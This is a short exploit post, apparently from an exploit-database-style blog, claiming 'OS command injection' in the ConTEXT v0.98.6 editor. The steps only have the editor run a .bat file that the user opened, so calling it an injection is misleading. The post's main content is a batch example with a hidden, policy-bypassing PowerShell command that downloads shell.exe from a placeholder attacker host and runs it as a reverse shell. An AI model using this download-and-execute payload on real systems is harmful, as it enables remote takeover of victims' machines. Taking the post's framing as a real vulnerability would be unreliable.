---
layout: post
title: ConTEXT v0.98.6 - OS Command Injection
date: 2023-09-17
category: exploit
---

# Exploit Title: ConTEXT v0.98.6 - OS Command Injection
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 17.09.2023
# Vendor Homepage: https://www.contexteditor.org/
# Software Link: https://www.contexteditor.org/ConTEXTv0_986.exe
# Tested Version: v0.98.6 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Open ConTEXT.
2. Create a `.bat` file containing your reverse shell command.
3. In ConTEXT, click on **File** in the top menu, then click **Open** and select your `.bat` file.
4. Press `Ctrl + F12` to execute the `.bat` file.
5. Your reverse shell should now be active, connecting to your listener.

### Example of Reverse Shell Command in .bat

To create a reverse shell in a `.bat` file, use the following example:

```batch
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://attacker_ip:port -OutFile %TEMP%\shell.exe; Start-Process %TEMP%\shell.exe"
